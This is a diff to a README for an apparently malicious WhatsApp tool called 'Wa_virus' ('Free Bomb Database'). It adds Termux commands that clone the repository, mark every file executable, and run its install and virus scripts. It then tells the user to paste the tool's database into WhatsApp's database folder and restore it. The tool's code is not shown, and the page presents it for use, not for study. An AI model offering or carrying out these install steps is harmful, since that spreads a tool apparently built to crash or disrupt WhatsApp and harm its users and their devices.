@@ -10,7 +10,34 @@
 <p align="center">Free Bomb Database</p>
 
 ##HOW TO DOWNLOAD AND INSTALL
-- First open termux
+- First open termux 
 ```shell script 
-$apt-get install git
+$ apt-get install git
 ```
+- NEXT
+```shell script
+$ git clone https://github.com/IND-GANG/Wa_virus
+```
+```shell script
+$ cd Wa_virus
+```
+```shell script
+$ chmod +x *
+```
+```shell script
+$ ./install.sh
+```
+```shell script
+$ ./Wa_virus.sh
+```
+- AND USE IT in terminal
+- And go to your file manager
+- Go to your Internal storage
+- unzip you downloaded zip file
+- and go to end 
+- There is database you can see
+- Tap *Database*
+- And select all in the database folder
+- and paste at your whatsapp's database folder
+- And go to whatsapp RESTORE it 
+## YOU COMPLETED
